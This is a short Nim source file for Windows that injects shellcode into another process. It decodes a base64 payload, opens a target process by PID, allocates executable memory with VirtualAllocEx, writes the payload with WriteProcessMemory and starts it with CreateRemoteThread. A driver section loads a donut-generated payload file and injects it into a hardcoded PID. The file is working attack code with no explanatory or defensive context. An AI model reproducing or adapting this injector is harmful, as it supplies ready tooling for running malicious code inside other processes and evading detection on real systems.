
when defined(windows):
    import winim/lean
    from base64 import decode
    proc toByteSeq*(data: string): seq[byte] = move cast[ptr seq[byte]](data.unsafeAddr)[]
    from os import getCurrentProcessId

proc execute*(sc: string, pid: int): bool = 
    when defined(windows):
        # let shellcode = array[byte, 1]
        # let shellcode = toByteSeq(decode(sc))
        var shellcode {.noinit.} : seq[byte]
        shellcode = toByteSeq(decode(sc))
        # pid = getCurrentProcessId()
        echo "current processid: ", getCurrentProcessId()
        echo "shellcode len: ", len(shellcode)
        let hProcess = OpenProcess(0x001F0FFF, false, cast[DWORD](pid))
        echo "hProcesS: ", hProcess
        let alloc = VirtualAllocEx(hProcess, NULL, uint(shellcode.len), 12288, 0x40)
        # echo "allocated memory: ", $(alloc)
        WriteProcessMemory(hProcess, alloc, addr(shellcode[0]), uint(shellcode.len), NULL)
        echo "wrote memory"
        let temp = cast[LPTHREAD_START_ROUTINE](alloc)
        CreateRemoteThread(hProcess, NULL, 0, temp, NULL, 0, NULL)
        echo "created thread"
        result = true
    result = true

# import io
import base64
let content = readFile(r"C:\repos\donut\payload.bin")
echo "content len: ", len(content)
echo "injected?: ", execute(encode(content), 12344)
